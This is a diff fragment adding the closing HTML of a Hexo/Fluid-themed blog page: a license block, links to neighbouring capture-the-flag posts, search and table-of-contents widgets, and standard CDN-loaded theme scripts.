+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/06/Tryhackme-retro/" title="Tryhackme-retro">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Tryhackme-retro</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-Backend/" title="HackTheBox-Backend">
+                        <span class="hidden-mobile">HackTheBox-Backend</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
